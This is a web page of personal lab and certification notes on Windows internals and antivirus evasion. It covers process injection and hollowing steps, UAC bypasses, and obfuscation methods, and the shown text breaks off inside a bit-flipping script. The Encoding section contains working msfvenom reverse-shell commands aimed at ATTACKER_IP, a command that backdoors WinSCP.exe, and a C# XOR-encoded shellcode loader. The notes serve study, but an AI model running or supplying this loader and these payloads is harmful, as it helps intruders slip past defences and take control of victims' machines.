@@ -1,0 +1,1049 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta https-equiv="content-type" content=
+  "text/html; charset=UTF-8">
+  <title>Evasion</title>
+  <meta name="viewport" content=
+  "initial-scale=1.0, maximum-scale=1.0, width=device-width">
+  <meta name="description" content=
+  "My notes from various labs and certs.">
+  <meta name="robots" content="index, follow">
+  <meta property="og:url" content="https://eli2k.com/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Home">
+  <meta property="og:description" content="Home">
+  <meta property="og:image" content=
+  "https://eli2k.com/resources/images/homepage.png">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/style.css">
+  <link rel="icon" href=
+  "https://eli2k.com/resources/images/bluscrn.gif" type=
+  "image/gif">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/prism.css">
+  <link rel="stylesheet" href=
+  "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+  <input type="checkbox" class="theme-switch" id="theme-switch">
+  <div id="page">
+    <label for="theme-switch" class="switch-label"></label>
+    <script src="https://eli2k.com/resources/js/prism.js"></script>
+    
+    <script>
+
+    NekoType = "robot"
+    </script>
+    <h1 id="nl">
+    <script src=
+    "https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a></h1>
+    <div id="container">
+      <div id="header">
+        <div class="text-container">
+          <span>E</span> <span>L</span> <span>I</span> <span>2</span> <span>K</span>
+        </div>
+      </div>
+      <div id="left-sidebar"></div>
+      <div class="divider"></div>
+      <div class="pageContent">
+        <div class="nav border">
+          <ul>
+            <a href="https://eli2k.com/" title="The homepage. acts as an index for all of the indexes.">
+              <li>Home
+              </li>
+            </a>
+            <a href="https://github.com/Eli2k765" title="My Github.">
+              <li>Github
+              </li>
+            </a>
+          </ul>
+        </div>
+        <div class="page-content blog border"><button id="toggle-all-btn">Show All</button>
+          <div class="box">
+            <div class="inner-box-content">
+              <div class="article-wrapper">
+                <h1>Evasion</h1>
+                <p class="alert">An introduction to evading common detection techniques</p><strong>Last updated:
+                March 5th, 2023</strong>
+                <article>
+                  <div id="contain">
+                    <h2>Host</h2>
+                    <h3>Windows Overview</h3>
+                    <div>
+                      <h4>Internals</h4>
+                      <div>
+                        <h5>Processes</h5>
+                        <table>
+                          <thead>
+                            <tr>
+                              <th>Process Components</th>
+                              <th>Purpose</th>
+                            </tr>
+                          </thead>
+                          <tbody>
+                            <tr>
+                              <td>Private Virtual Address Space</td>
+                              <td>Virtual memory addresses that the process is allocated.</td>
+                            </tr>
+                            <tr>
+                              <td>Executable Program</td>
+                              <td>Defines code and data stored in the virtual address space.</td>
+                            </tr>
+                            <tr>
+                              <td>Open Handles</td>
+                              <td>Defines handles to system resources accessible to the process.</td>
+                            </tr>
+                            <tr>
+                              <td>Security Context</td>
+                              <td>The access token defines the user, security groups, privileges, and other security information.</td>
+                            </tr>
+                            <tr>
+                              <td>Process ID</td>
+                              <td>Unique numerical identifier of the process.</td>
+                            </tr>
+                            <tr>
+                              <td>Threads</td>
+                              <td>Section of a process scheduled for execution.</td>
+                            </tr>
+                          </tbody>
+                        </table>
+                        <table>
+                          <thead>
+                            <tr>
+                              <th>Components of a Process in Memory</th>
+                              <th>Purpose</th>
+                            </tr>
+                          </thead>
+                          <tbody>
+                            <tr>
+                              <td>Code</td>
+                              <td>Code to be executed by the process.</td>
+                            </tr>
+                            <tr>
+                              <td>Global Variables</td>
+                              <td>Stored variables.</td>
+                            </tr>
+                            <tr>
+                              <td>Process Heap</td>
+                              <td>Defines the heap where data is stored.</td>
+                            </tr>
+                            <tr>
+                              <td>Process Resources</td>
+                              <td>Defines further resources of the process.</td>
+                            </tr>
+                            <tr>
+                              <td>Environment Block</td>
+                              <td>Data structure to define process information.</td>
+                            </tr>
+                          </tbody>
+                        </table>
+                        <ul>
+                          <li>Common Process Injection Steps</li>
+                          <ul>
+                            <li>Shellcode Injection</li>
+                            <ol>
+                              <li>Open a target process with all access rights.</li>
+                              <ul>
+                                <li>OpenProcess</li>
+                              </ul>
+                              <li>Allocate target process memory for the shellcode.</li>
+                              <ul>
+                                <li>VirtualAllocEx</li>
+                              </ul>
+                              <li>Write shellcode to allocated memory in the target process.</li>
+                              <ul>
+                                <li>WriteProcessMemory</li>
+                              </ul>
+                              <li>Execute the shellcode using a remote thread.</li>
+                              <ul>
+                                <li>CreateRemoteThread</li>
+                              </ul>
+                            </ol>
+                            <li>Process Hollowing</li>
+                            <ol>
+                              <li>Create a target process in a suspended state.</li>
+                              <ul>
+                                <li>CreateProcessA</li>
+                              </ul>
+                              <li>Open a malicious image.</li>
+                              <ul>
+                                <li>CreateFileA</li>
+                                <li>GetFileSize</li>
+                                <li>VirtualAlloc</li>
+                                <li>ReadFile</li>
+                              </ul>
+                              <li>Un-map legitimate code from process memory.</li>
+                              <ul>
+                                <li>GetThreadContext</li>
+                                <li>ReadProcessMemory</li>
+                                <li>GetModuleHandleA</li>
+                                <li>ZwUnmapViewOfSection</li>
+                              </ul>
+                              <li>Allocate memory locations for malicious code and write each section into the address space.</li>
+                              <ul>
+                                <li>VirtualAlloc</li>
+                                <li>WriteProcessMemory</li>
+                              </ul>
+                              <li>Set an entry point for the malicious code.</li>
+                              <ul>
+                                <li>SetThreadContext</li>
+                              </ul>
+                              <li>Take the target process out of a suspended state.</li>
+                              <ul>
+                                <li>ResumeThread</li>
+                              </ul>
+                            </ol>
+                          </ul>
+                        </ul>
+                        <h5>Threads</h5>
+                        <table>
+                          <thead>
+                            <tr>
+                              <th>Component</th>
+                              <th>Purpose</th>
+                            </tr>
+                          </thead>
+                          <tbody>
+                            <tr>
+                              <td>Stack</td>
+                              <td>All data relevant and specific to the thread (exceptions, procedure calls, etc.)</td>
+                            </tr>
+                            <tr>
+                              <td>Thread Local Storage</td>
+                              <td>Pointers for allocating storage to a unique data environment</td>
+                            </tr>
+                            <tr>
+                              <td>Stack Argument</td>
+                              <td>Unique value assigned to each thread</td>
+                            </tr>
+                            <tr>
+                              <td>Context Structure</td>
+                              <td>Holds machine register values maintained by the kernel</td>
+                            </tr>
+                          </tbody>
+                        </table>
+                        <ul> 
+                          <li>Thread Execution Hijacking</li>
+                          <ol>
+                            <li>Locate and open a target process to control.</li>
+                            <ul>
+                              <li>OpenProcess</li>
+                            </ul>
+                            <li>Allocate memory region for malicious code.</li>
+                            <ul>
+                              <li>VirtualAllocEx</li>
+                            </ul>
+                            <li>Write malicious code to allocated memory.</li>
+                            <ul>
+                              <li>WriteProcessMemory</li>
+                            </ul>
+                            <li>Identify the thread ID of the target thread to hijack.</li>
+                            <ul>
+                              <li>CreateToolhelp32Snapshot</li>
+                              <li>Thread32First</li>
+                              <li>Thread32Next</li>
+                            </ul>
+                            <li>Open the target thread.</li>
+                            <ul>
+                              <li>OpenThread</li>
+                            </ul>
+                            <li>Suspend the target thread.</li>
+                            <ul>
+                              <li>SuspendThread</li>
+                            </ul>
+                            <li>Obtain the thread context.</li>
+                            <ul>
+                              <li>GetThreadContext</li>
+                            </ul>
+                            <li>Update the instruction pointer to the malicious code.</li>
+                            <li>Rewrite the target thread context.</li>
+                            <ul>
+                              <li>SetThreadContext</li>
+                            </ul>
+                            <li>Resume the hijacked thread.</li>
+                            <ul>
+                              <li>ResumeThread</li>
+                            </ul>
+                          </ol>
+                        </ul>
+                        <h5>Virtual Memory</h5>
+                        <ul>
+                          <li>Provides each process with a private virtual address space</li>
+                          <li>A memory manager translates virtual and physical addresses</li>
+                          <li>The theoretical maximum virtual address space is 4 GB on a 32-bit x86 system and 256 TB on a 64-bit modern system</li>
+                          <li>The address space is split in half, bottom for processes and top for OS</li>
+                          <ul>
+                            <li>Administrators can alter this allocation layout for applications that require a larger address space through settings (increaseUserVA) or the AWE (Address Windowing Extensions)</li>
+                          </ul>
+                        </ul>
+                        <h5>DLLs</h5>
+                        <ul>
+                          <li>A library that contains code and data that can be used by more than one program at the same time</li>
+                          <li>When a DLL is loaded as a function in a program, the DLL is assigned as a dependency</li>
+                          <li>DLLs can be loaded in a program using load-time dynamic linking (explicit calls by using header (.h) and import library (.lib) file) or run-time dynamic linking (a separate function (LoadLibrary or LoadLibraryEx) loads the DLL and called using GetProcAddress).</li>
+                        </ul>
+                        <ul>
+                          <li>Dynamic-link Library Injection (DLL Injection)</li>
+                          <ol>
+                            <li>Locate a target process to inject.</li>
+                            <ul>
+                              <li>getProcessId</li>
+                              <li>CreateToolhelp32Snapshot</li>
+                              <li>Process32First</li>
+                              <li>Process32Next</li>
+                            </ul>
+                            <li>Open the target process.</li>
+                            <ul>
+                              <li>OpenProcess</li>
+                            </ul>
+                            <li>Allocate memory region for malicious DLL.</li>
+                            <ul>
+                              <li>VirtualAllocEx</li>
+                            </ul>
+                            <li>Write the malicious DLL to allocated memory.</li>
+                            <ul>
+                              <li>WriteProcessMemory</li>
+                            </ul>
+                            <li>Load and execute the malicious DLL.</li>
+                            <ul>
+                              <li>LoadLibrary</li>
+                              <li>GetProcAddress</li>
+                              <li>GetModuleHandle</li>
+                              <li>CreateRemoteThread</li>
+                            </ul>
+                          </ol>
+                        </ul>
+                        <h5>PE format</h5>
+                        <ul>
+                          <li>The PE (Portable Executable) and COFF (Common Object File Format) files make up the PE format</li>
+                          <li>The PE format defines the information about the executable, stored data, and the structure of how data components are stored.</li>
+                        </ul>
+                        <table>
+                          <thead>
+                            <tr>
+                              <th>Component</th>
+                              <th>Description</th>
+                            </tr>
+                          </thead>
+                          <tbody>
+                            <tr>
+                              <td>DOS Header</td>
+                              <td>Initial part of the PE file with DOS-specific information.</td>
+                            </tr>
+                            <tr>
+                              <td>MZ DOS Header</td>
+                              <td>Marked by "MZ" signature, it is the start of the DOS header.</td>
+                            </tr>
+                            <tr>
+                              <td>DOS Stub</td>
+                              <td>Run by default at the beginning of a file that prints a compatibility message.</td>
+                            </tr>
+                            <tr>
+                              <td>PE File Header</td>
+                              <td>Contains information about the structure and attributes of the PE file.</td>
+                            </tr>
+                            <tr>
+                              <td>Image Optional Header</td>
+                              <td>Additional information about the PE file, including the entry point, image base, and more.</td>
+                            </tr>
+                            <tr>
+                              <td>Data Dictionaries</td>
+                              <td>Tables that store various data structures and information about the PE file.</td>
+                            </tr>
+                            <tr>
+                              <td>Section Table</td>
+                              <td>Descriptions of each section in the PE file, including code and data sections.</td>
+                            </tr>
+                          </tbody>
+                        </table>
+                        <p>The Section table has the following sections:</p>
+                        <table>
+                          <thead>
+                            <tr>
+                              <th>Section</th>
+                              <th>Purpose</th>
+                            </tr>
+                          </thead>
+                          <tbody>
+                            <tr>
+                              <td>.text</td>
+                              <td>Contains executable code and the entry point for the program.</td>
+                            </tr>
+                            <tr>
+                              <td>.data</td>
+                              <td>Contains initialized data such as strings, variables, and other data.</td>
+                            </tr>
+                            <tr>
+                              <td>.rdata</td>
+                              <td>Read Only</td>
+                            </tr>
+                            <tr>
+                              <td>.edata</td>
+                              <td>Exportable objects</td>
+                            </tr>
+                            <tr>
+                              <td>.idata</td>
+                              <td>Imported objects</td>
+                            </tr>
+                            <tr>
+                              <td>.reloc</td>
+                              <td>Relocation information used to adjust addresses when the PE file is loaded at a different base address.</td>
+                            </tr>
+                            <tr>
+                              <td>.rsrc</td>
+                              <td>Contains application resources such as images, icons, and other non-executable data.</td>
+                            </tr>
+                            <tr>
+                              <td>.debug</td>
+                              <td>Contains debug information used for debugging and symbol resolution.</td>
+                            </tr>
+                          </tbody>
+                        </table>
+                        <ul>
+                          <li>Defining the shellcode as a local variable within the main function will store it in the .TEXT PE section.</li>
+                          <li>Defining the shellcode as a global variable will store it in the .Data section.</li>
+                          <li>Another technique involves storing the shellcode as a raw binary in an icon image and linking it within the code, so in this case, it shows up in the .rsrc Data section.</li>
+                          <li>We can add a custom data section to store the shellcode.</li>
+                        </ul>
+
+                      </div>
+                      <h4>API</h4>
+                      <div>
+                        <h5>Subsystem and Hardware Interaction</h5>
+                        <table>
+                          <thead>
+                            <tr>
+                              <th>Mode</th>
+                              <th>Access to Hardware</th>
+                              <th>Memory Access</th>
+                            </tr>
+                          </thead>
+                          <tbody>
+                            <tr>
+                              <td>User Mode</td>
+                              <td>No direct hardware access</td>
+                              <td>Access to "owned" memory locations</td>
+                            </tr>
+                            <tr>
+                              <td>Kernel Mode</td>
+                              <td>Direct hardware access</td>
+                              <td>Access to entire physical memory</td>
+                            </tr>
+                          </tbody>
+                        </table>
+                        <h5>Components of the Windows API</h5>
+                        <table>
+                          <thead>
+                            <tr>
+                              <th>Layer</th>
+                              <th>Explanation</th>
+                            </tr>
+                          </thead>
+                          <tbody>
+                            <tr>
+                              <td>API</td>
+                              <td>A top-level/general term or theory used to describe any call found in the Win32 API structure.</td>
+                            </tr>
+                            <tr>
+                              <td>Header files or imports</td>
+                              <td>Defines libraries to be imported at run-time, defined by header files or library imports. Uses pointers to obtain the function address.</td>
+                            </tr>
+                            <tr>
+                              <td>Core DLLs</td>
+                              <td>A group of four DLLs that define call structures (KERNEL32, USER32, and ADVAPI32). These DLLs define kernel and user services that are not contained in a single subsystem.</td>
+                            </tr>
+                            <tr>
+                              <td>Supplemental DLLs</td>
+                              <td>Other DLLs defined as part of the Windows API. Control separate subsystems of the Windows OS. Approximately 36 other defined DLLs (e.g., NTDLL, COM, FVEAPI, etc.).</td>
+                            </tr>
+                            <tr>
+                              <td>Call Structures</td>
+                              <td>Defines the API call itself and parameters of the call.</td>
+                            </tr>
+                            <tr>
+                              <td>API Calls</td>
+                              <td>The API call used within a program, with function addresses obtained from pointers.</td>
+                            </tr>
+                            <tr>
+                              <td>In/Out Parameters</td>
+                              <td>The parameter values that are defined by the call structures.</td>
+                            </tr>
+                          </tbody>
+                        </table>
+                        <h5>Call Structures</h5>
+                        <ul>
+                          <li><a href="https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows API Index</a></li>
+                          <li><a href="http://pinvoke.net/">PInvoke</a></li>
+                        </ul>
+                        <h5>OS Libraries</h5>
+                        <p>ASLR obscures memory address locations. P/Invoke and windows.h are two common ways to overcome the limitations introduced by ASLR.</p>
+                        <ul>
+                          <li>Windows Header File</li>
+                          <ul>
+                            <li>Once the windows.h file is included at the top of an unmanaged program; any Win32 function can be called.</li>
+                          </ul>
+                          <li>P/Invoke</li>
+                          <ul>
+                            <li>P/invoke provides tools to handle the entire process of invoking an unmanaged function from managed code or, in other words, calling the Win32 API.</li>
+                          </ul>
+                        </ul>
+                        <h5>Commonly Abused API Calls</h5>
+                        <ul>
+                          <li><a href="https://malapi.io/">Extensive List</a></li>
+                        </ul>
+                        <table>
+                          <thead>
+                            <tr>
+                              <th>API Call</th>
+                              <th>Explanation</th>
+                            </tr>
+                          </thead>
+                          <tbody>
+                            <tr>
+                              <td>LoadLibraryA</td>
+                              <td>Maps a specified DLL into the address space of the calling process.</td>
+                            </tr>
+                            <tr>
+                              <td>GetUserNameA</td>
+                              <td>Retrieves the name of the user associated with the current thread.</td>
+                            </tr>
+                            <tr>
+                              <td>GetComputerNameA</td>
+                              <td>Retrieves a NetBIOS or DNS name of the local computer.</td>
+                            </tr>
+                            <tr>
+                              <td>GetVersionExA</td>
+                              <td>Obtains information about the version of the operating system currently running.</td>
+                            </tr>
+                            <tr>
+                              <td>GetModuleFileNameA</td>
+                              <td>Retrieves the fully qualified path for the file of the specified module and process.</td>
+                            </tr>
+                            <tr>
+                              <td>GetStartupInfoA</td>
+                              <td>Retrieves contents of STARTUPINFO structure (window station, desktop, standard handles, and appearance of a process).</td>
+                            </tr>
+                            <tr>
+                              <td>GetModuleHandle</td>
+                              <td>Returns a module handle for the specified module if mapped into the calling process's address space.</td>
+                            </tr>
+                            <tr>
+                              <td>GetProcAddress</td>
+                              <td>Returns the address of a specified exported DLL function.</td>
+                            </tr>
+                            <tr>
+                              <td>VirtualProtect</td>
+                              <td>Changes the protection on a region of memory in the virtual address space of the calling process.</td>
+                            </tr>
+                          </tbody>
+                        </table>
+                      </div>
+                      <h4>UAC</h4>
+                      <div>
+                        <h5>UAC Overview</h5>
+                        <ul>
+                          <li>UAC forces new processes to run as non-privileged</li>
+                          <li>Elevation presents a dialogue box for the user to confirm</li>
+                          <li>UAC is MIC:</li>
+                          <ul>
+                            <table>
+                              <thead>
+                                <tr>
+                                  <th>Integrity Level</th>
+                                  <th>Use</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Low</td>
+                                  <td>Generally used for interaction with the Internet (i.e., Internet Explorer). Has very limited permissions.</td>
+                                </tr>
+                                <tr>
+                                  <td>Medium</td>
+                                  <td>Assigned to standard users and Administrators' filtered tokens.</td>
+                                </tr>
+                                <tr>
+                                  <td>High</td>
+                                  <td>Used by Administrators' elevated tokens if UAC is enabled. If UAC is disabled, all administrators will always use a high IL token.</td>
+                                </tr>
+                                <tr>
+                                  <td>System</td>
+                                  <td>Reserved for system use.</td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </ul>
+                          <li>Non-administrators will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has Medium IL.</li>
+                          <li>Administrators will receive two access tokens: </li>
+                          <ul>
+                            <li>Filtered Token: A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.</li>
+                            <li>Elevated Token: A token with full Administrator privileges, used when something needs to be run with administrative privileges. This token has High IL</li>
+                          </ul>
+                        </ul>
+                        <h5>UAC Internals</h5>
+                        <ol>
+                          <li>The user requests to run an application as administrator.</li>
+                          <li>A ShellExecute API call is made using the runas verb.</li>
+                          <li>The request gets forwarded to Appinfo to handle elevation.</li>
+                          <li>The application manifest is checked to see if AutoElevation is allowed</li>
+                          <li>Appinfo executes consent.exe, which shows the UAC prompt on a secure desktop.</li>
+                          <ul>
+                            <li>A secure desktop is simply a separate desktop that isolates processes from whatever is running in the actual user's desktop to avoid other processes from tampering with the UAC prompt in any way.</li>
+                          </ul>
+                          <li>If the user gives consent to run the application as administrator, the Appinfo service will execute the request using a user's Elevated Token.</li>
+                          <li>Appinfo will then set the parent process ID of the new process to point to the shell from which elevation was requested.</li>
+                        </ol>
+                        <h5>UAC Bypasses</h5>
+                        <ul>
+                          <li>Gui</li>
+                          <ul>
+                            <li>msconfig.exe</li>
+                            <ul>
+                              <li>Launching a command prompt from the tools section will spawn at High IL</li>
+                            </ul>
+                            <li>azman.msc</li>
+                            <ul>
+                              <li>A shell can be spawned by going to help, right clicking on the page and hitting View Source. Then, from notepad open cmd.exe</li>
+                            </ul>
+                          </ul>
+                        </ul>
+                        <h5>UAC Automated Exploitation</h5>
+                      </div>
+                    </div>
+                    <h3>Evasion Techniques</h3>
+                    <div>
+                      <h4>AV Review</h4>
+                      <div>
+                        <ul>
+                          <li>Static Detection</li>
+                          <ul>
+                            <li>Uses pattern-matching techniques in the detection, such as finding a unique string, CRC (Checksums), sequence of bytecode/Hex values, and Cryptographic hashes (MD5, SHA1, etc.)</li>
+                          </ul>
+                          <li>Dynamic Detection</li>
+                          <ul>
+                            <li>Checks files at runtime by using Windows Hooks to inspect api and application calls or by sandboxing apps and running them to observe.</li>
+                          </ul>
+                          <li>Heuristics Detection</li>
+                          <ul>
+                            <li>Static</li>
+                            <ul>
+                              <li>Decompiling (if possible) and extracting the source code of the malicious software.</li>
+                            </ul>
+                            <li>Dynamic</li>
+                            <ul>
+                              <li>Uses predefined behavioral rules</li>
+                            </ul>
+                          </ul>
+                        </ul>
+                      </div>
+                      <h4>Shellcode</h4>
+                      <div>
+                        <h5>Creating Shellcode</h5>
+                        <ul>
+                          <li>We have to know what values we need to set in different processor registers to make syscalls</li>
+                          <ul>
+                            <li>For x64 Linux:</li>
+                            <ul>
+                              <li>The rax register is used to indicate the function in the kernel</li>
+                              <li>Parameters are set through the rdi, rsi and rdx registers</li>
+                              <li><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Call Table</a></li>
+                            </ul>
+                          </ul>
+                          <li>We need to define a section and a start</li>
+                          <li>jmp to function that has a call to the function that sets all the values</li>
+                          <li>Compile: nasm -f elf64 file.asm</li>
+                          <li>extract text section: objcopy -j .text -O binary file file.text</li>
+                          <li>convert to hex: xxd -i file.text</li>
+                        </ul>
+                        <h5>Encoding, Encrypting, Packing and Binding</h5>
+                        <ul>
+                          <li>Encoding</li>
+                          <ul>
+                            <li><pre><code class="language-csharp">#Likely to be flagged
+msfvenom --list encoders | grep excellent
+
+#Custom
+#payload
+msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
+
+#encoder
+
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Encrypter
+{
+    internal class Program
+    {
+        private static byte[] xor(byte[] shell, byte[] KeyBytes)
+        {
+            for (int i = 0; i < shell.Length; i++)
+            {
+                shell[i] ^= KeyBytes[i % KeyBytes.Length];
+            }
+            return shell;
+        }
+        static void Main(string[] args)
+        {
+            //XOR Key - It has to be the same in the Droppr for Decrypting
+            string key = "PassK3y123!";
+
+            //Convert Key into bytes
+            byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+
+            //Original Shellcode here (csharp format)
+            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };
+
+            //XORing byte by byte and saving into a new array of bytes
+            byte[] encoded = xor(buf, keyBytes);
+            Console.WriteLine(Convert.ToBase64String(encoded));        
+        }
+    }
+}
+
+#selfdecoding payload
+
+using System;
+using System.Net;
+using System.Text;
+using System.Runtime.InteropServices;
+
+public class Program {
+  [DllImport("kernel32")]
+  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+  [DllImport("kernel32")]
+  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+  [DllImport("kernel32")]
+  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+  private static UInt32 MEM_COMMIT = 0x1000;
+  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+  
+  private static byte[] xor(byte[] shell, byte[] KeyBytes)
+        {
+            for (int i = 0; i < shell.Length; i++)
+            {
+                shell[i] ^= KeyBytes[i % KeyBytes.Length];
+            }
+            return shell;
+        }
+  public static void Main()
+  {
+
+    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
+    byte[] data = Convert.FromBase64String(dataBS64);
+
+    string key = "PassK3y123!";
+    //Convert Key into bytes
+    byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+
+    byte[] encoded = xor(data, keyBytes);
+
+    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);
+
+    IntPtr threadHandle = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr parameter = IntPtr.Zero;
+    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+
+    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+  }
+}
+
+                          </code></pre></li>
+                          </ul>
+                          <li>Encryption</li>
+                          <ul>
+                            <li><pre><code class="language-bash">msfvenom --list encrypt</code></pre></li>
+                          </ul>
+                          <li>Packers</li>
+                          <ul>
+                            <li>Achieve some level of obfuscation by implementing a mixture of transforms that include compressing, encrypting, adding debugging protections and many others.</li>
+                            <li>Packed code is executed like this:</li>
+                            <ol>
+                              <li>The unpacker gets executed first, as it is the executable's entry point.</li>
+                              <li>The unpacker reads the packed application's code.</li>
+                              <li>The unpacker will write the original unpacked code somewhere in memory and direct the execution flow of the application to it.</li>
+                            </ol>
+                            <li>If the AV does in-memory scans, malicious code may be picked up.</li>
+                          </ul>
+                          <li>Binders</li>
+                          <ul>
+                            <li>Merge two (or more) executables into a single one.</li>
+                            <li>Does not evade AVs but can trick users</li>
+                            <li><pre><code class="language-bash">msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe</code></pre></li>
+                          </ul>
+                        </ul>
+                      </div>
+                      <h4>Obfuscation</h4>
+                      <div>
+                        <ul>
+                          <li>Obfuscation Methods</li>
+                          <ul>
+                            <table>
+                              <thead>
+                                <tr>
+                                  <th>Obfuscation Method</th>
+                                  <th>Purpose</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Array Transformation</td>
+                                  <td>Transforms an array by splitting, merging, folding, and flattening</td>
+                                </tr>
+                                <tr>
+                                  <td>Data Encoding</td>
+                                  <td>Encodes data with mathematical functions or ciphers</td>
+                                </tr>
+                                <tr>
+                                  <td>Data Procedurization</td>
+                                  <td>Substitutes static data with procedure calls</td>
+                                </tr>
+                                <tr>
+                                  <td>Data Splitting/Merging</td>
+                                  <td>Distributes information of one variable into several new variables</td>
+                                </tr>
+                                <tr>
+                                  <td>Junk Code</td>
+                                  <td>Adds junk instructions that are non-functional, also known as code stubs</td>
+                                </tr>
+                                <tr>
+                                  <td>Separation of Related Code</td>
+                                  <td>Separates related codes or instructions to increase difficulty in reading the program</td>
+                                </tr>
+                                <tr>
+                                  <td>Stripping Redundant Symbols</td>
+                                  <td>Strips symbolic information such as debug information or other symbol tables</td>
+                                </tr>
+                                <tr>
+                                  <td>Meaningless Identifiers</td>
+                                  <td>Transforms a meaningful identifier to something meaningless</td>
+                                </tr>
+                                <tr>
+                                  <td>Implicit Controls</td>
+                                  <td>Converts explicit control instructions to implicit instructions</td>
+                                </tr>
+                                <tr>
+                                  <td>Dispatcher-based Controls</td>
+                                  <td>Determines the next block to be executed during runtime</td>
+                                </tr>
+                                <tr>
+                                  <td>Probabilistic Control Flows</td>
+                                  <td>Introduces replications of control flows with the same semantics but different syntax</td>
+                                </tr>
+                                <tr>
+                                  <td>Bogus Control Flows</td>
+                                  <td>Control flows deliberately added to a program but will never be executed</td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </ul>
+                          <li>Object Concatenation</li>
+                          <ul>
+                            <table>
+                              <thead>
+                                <tr>
+                                  <th>Language</th>
+                                  <th>Concatenation Operator</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Python</td>
+                                  <td>“+”</td>
+                                </tr>
+                                <tr>
+                                  <td>PowerShell</td>
+                                  <td>“+”, ”,”, ”$”, or no operator at all</td>
+                                </tr>
+                                <tr>
+                                  <td>C#</td>
+                                  <td>“+”, “String.Join”, “String.Concat”</td>
+                                </tr>
+                                <tr>
+                                  <td>C</td>
+                                  <td>“strcat”</td>
+                                </tr>
+                                <tr>
+                                  <td>C++</td>
+                                  <td>“+”, “append”</td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </ul>
+                          <li>Non-Interpreted Characters</li>
+                          <ul>
+                            <table>
+                              <thead>
+                                <tr>
+                                  <th>Character</th>
+                                  <th>Purpose</th>
+                                  <th>Example</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Breaks</td>
+                                  <td>Break a single string into multiple substrings and combine them</td>
+                                  <td>('co'+'ffe'+'e')</td>
+                                </tr>
+                                <tr>
+                                  <td>Reorders</td>
+                                  <td>Reorder a string’s components</td>
+                                  <td>('{1}{0}'-f'ffee','co')</td>
+                                </tr>
+                                <tr>
+                                  <td>Whitespace</td>
+                                  <td>Include white space that is not interpreted</td>
+                                  <td>.( 'Ne' +'w-Ob' + 'ject')</td>
+                                </tr>
+                                <tr>
+                                  <td>Ticks</td>
+                                  <td>Include ticks that are not interpreted</td>
+                                  <td>d\`own\`LoAd\`Stri\`ng</td>
+                                </tr>
+                                <tr>
+                                  <td>Random Case</td>
+                                  <td>Tokens are generally not case sensitive and can be any arbitrary case</td>
+                                  <td>dOwnLoAdsTRing</td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </ul>
+                        </ul>
+                      </div>
+                      <h4>Signature</h4>
+                      <div>
+                        <ul>
+                          <li>Static Code-Based</li>
+                          <ul>
+                            <li>Obfuscation Methods
+                            <table>
+                              <thead>
+                                <tr>
+                                  <th>Obfuscation Method</th>
+                                  <th>Purpose</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Method Proxy</td>
+                                  <td>Creates a proxy method or a replacement object</td>
+                                </tr>
+                                <tr>
+                                  <td>Method Scattering/Aggregation</td>
+                                  <td>Combines multiple methods into one or scatters a method into several</td>
+                                </tr>
+                                <tr>
+                                  <td>Method Clone</td>
+                                  <td>Creates replicas of a method and randomly calls each</td>
+                                </tr>
+                              </tbody>
+                            </table></li>
+                            <li>Obfuscation Classes</li>
+                            <ul>
+                              <table>
+                              <thead>
+                                <tr>
+                                  <th>Obfuscation Method</th>
+                                  <th>Purpose</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Class Hierarchy Flattening</td>
+                                  <td>Create proxies for classes using interfaces</td>
+                                </tr>
+                                <tr>
+                                  <td>Class Splitting/Coalescing</td>
+                                  <td>Transfer local variables or instruction groups to another class</td>
+                                </tr>
+                                <tr>
+                                  <td>Dropping Modifiers</td>
+                                  <td>Remove class modifiers (public, private) and make all members public</td>
+                                </tr>
+                              </tbody>
+                              </table>
+                            </ul>
+                          </ul>
+                          <li>Static Property-Based Signatures</li>
+                          <ul>
+                            <li>File Hashes</li>
+                            <ul>
+                              <li>Bit Flipping: <pre><code class="language-python">import sys
+
+orig = list(open(sys.argv[1], "rb").read())
+
+i = 0
+while i < len(orig):
+  current = list(orig)
